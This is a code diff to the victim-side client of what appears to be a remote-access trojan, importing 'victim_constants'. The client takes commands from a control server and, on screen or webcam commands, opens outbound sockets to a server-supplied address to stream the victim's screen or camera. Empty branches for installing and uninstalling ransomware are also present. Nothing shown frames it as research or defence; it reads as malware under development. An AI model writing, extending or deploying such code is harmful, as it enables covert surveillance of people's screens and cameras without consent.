@@ -1,8 +1,8 @@
 import threading
 from victim_constants import *
 import socket
-import ScreenSharing.host.host as screenSharingHost
-import WebCamSharing.host.host as webCamSharingHost
+import ScreenSharing.sharer.sharer as scSharer
+import WebCamSharing.sharer.sharer as wcSharer
 
 soc = None
 
@@ -18,16 +18,16 @@ def connectToServer():
 def getCommand():
     command = soc.recv(1024).decode()
     print(f"Recv command! : {command}")
-    processCommand(command)
+    return command
 
 def processCommand(command):
     if command == WATCH_SCREEN_COMMAND:
-        threading.Thread(target=screenSharingHost.main, kwargs={'ip' : SCREEN_SHARING_IP, 'port' : SCREEN_SHARING_PORT, 'only_one_connection' : True}).start()
-        soc.send(f"{SCREEN_SHARING_IP} {SCREEN_SHARING_PORT}".encode())
-
+        ip, port = soc.recv(1024).decode().split(' ')
+        threading.Thread(target= handleScreenSharing, args=(ip, int(port))).start()
+        
     elif command == WATCH_WEBCAM_COMMAND:
-        threading.Thread(target=webCamSharingHost.main, kwargs= {'ip' : WEB_CAM_IP, 'port' : WEB_CAM_PORT, 'only_one_connection' : True}).start()
-        soc.send(f"{WEB_CAM_IP} {WEB_CAM_PORT}".encode())
+        ip, port = soc.recv(1024).decode().split(' ')
+        threading.Thread(target= handleWebCameraSharing, args=(ip, int(port))).start()
 
     elif command == INSTALL_RANSOMWARE_COMMAND:
         pass
@@ -35,6 +35,18 @@ def processCommand(command):
     elif command == UNINSTALL_RANSOMWARE_COMMAND:
         pass
 
+
+def handleScreenSharing(ip ,port):
+    screenShareSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    screenShareSoc.connect((ip, port))
+
+    scSharer.shareScreen(screenShareSoc)
+
+def handleWebCameraSharing(ip ,port):
+    screenShareSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    screenShareSoc.connect((ip, port))
+
+    wcSharer.shareWebCam(screenShareSoc)
 
 def main():
     connectToServer()
